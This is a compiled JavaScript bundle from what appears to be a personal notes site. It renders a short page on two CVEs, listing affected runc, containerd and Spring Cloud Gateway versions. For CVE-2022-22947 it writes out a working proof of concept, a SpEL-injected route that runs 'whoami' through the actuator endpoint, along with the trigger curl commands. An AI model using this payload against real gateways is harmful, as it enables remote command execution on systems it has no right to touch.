"use strict";(self.webpackChunkwener_website=self.webpackChunkwener_website||[]).push([["87309"],{33482:function(e,n,t){t.r(n),t.d(n,{metadata:()=>r,contentTitle:()=>a,default:()=>h,assets:()=>l,toc:()=>o,frontMatter:()=>c});var r=JSON.parse('{"id":"security/cve","title":"CVE","description":"- https://www.cve.org/","source":"@site/../notes/security/cve.md","sourceDirName":"security","slug":"/security/cve","permalink":"/notes/security/cve","draft":false,"unlisted":false,"editUrl":"https://github.com/wenerme/wener/edit/master/notes/../notes/security/cve.md","tags":[],"version":"current","lastUpdatedBy":"wener","lastUpdatedAt":1709090151000,"frontMatter":{"title":"CVE"},"sidebar":"docs","previous":{"title":"SOPS","permalink":"/notes/security/crypto/sops"},"next":{"title":"cvechecker","permalink":"/notes/security/cvechecker"}}'),s=t("52676"),i=t("79938");let c={title:"CVE"},a="CVE",l={},o=[{value:"CVE-2024-21626",id:"cve-2024-21626",level:2},{value:"CVE-2022-22947",id:"cve-2022-22947",level:2}];function d(e){let n={a:"a",code:"code",h1:"h1",h2:"h2",header:"header",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,i.a)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"cve",children:"CVE"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://www.cve.org/",children:"https://www.cve.org/"})}),"\n"]}),"\n",(0,s.jsx)(n.h2,{id:"cve-2024-21626",children:"CVE-2024-21626"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"containerd 1.5.13 - 1.6.20"}),"\n",(0,s.jsx)(n.li,{children:"1.0.0-rc93 <= runc <= 1.1.11"}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://help.aliyun.com/noticelist/articleid/1069353299.html",children:"https://help.aliyun.com/noticelist/articleid/1069353299.html"})}),"\n"]}),"\n",(0,s.jsx)(n.h2,{id:"cve-2022-22947",children:"CVE-2022-22947"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:["Java, SpringCloud Gateway\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"3.1.0"}),"\n",(0,s.jsx)(n.li,{children:"3.0.0-3.0.6"}),"\n",(0,s.jsx)(n.li,{children:"< 3.0"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# \u6D4B\u8BD5 gateway \u662F\u5426\u5F00\u542F actuator \u7BA1\u7406\ncurl -X POST http://gateway/actuator/gateway/refresh -v\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"\u6CE8\u5165\u6076\u610F\u8DEF\u7531"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-http",children:'POST http://gateway/actuator/gateway/routes/pentest\nContent-Type: application/json\n\n{\n  "id": "pentest",\n  "filters": [\n    {\n      "name": "AddResponseHeader",\n      "args": {\n        "name": "X-Request-Foo",\n        "": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(getRuntime().exec(new String[]{\\"whoami\\"}).getInputStream()))}"\n      },\n      "uri": "http://httpbin.org/get",\n      "predicates": [\n        {\n          "name": "Method",\n          "args": {\n            "_key_0": "GET"\n          }\n        },\n        {\n          "name": "Path",\n          "args": {\n            "_key_0": "/pentest"\n          }\n        }\n      ]\n    }\n  ]\n}\n'})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# \u5237\u65B0\ncurl -X POST http://gateway/actuator/gateway/refresh -v\n# \u65B0\u7684\u8DEF\u7531\u5305\u542B X-Request-Foo: $(whoami)\ncurl -X POST http://gateway/pentest -v\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"\u914D\u7F6E\u4E0D\u540C\u65F6\u6EE1\u8DB3\u5373\u53EF"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-ini",children:"management.endpoint.gateway.enabled=true # default value\nmanagement.endpoints.web.exposure.include=gateway\n"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://spring.io/security/cve-2022-22947",children:"https://spring.io/security/cve-2022-22947"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://www.anquanke.com/post/id/269795",children:"https://www.anquanke.com/post/id/269795"})}),"\n"]})]})}function h(e={}){let{wrapper:n}={...(0,i.a)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},79938:function(e,n,t){t.d(n,{Z:function(){return a},a:function(){return c}});var r=t(75271);let s={},i=r.createContext(s);function c(e){let n=r.useContext(i);return r.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:c(e.components),r.createElement(i.Provider,{value:n},e.children)}}}]);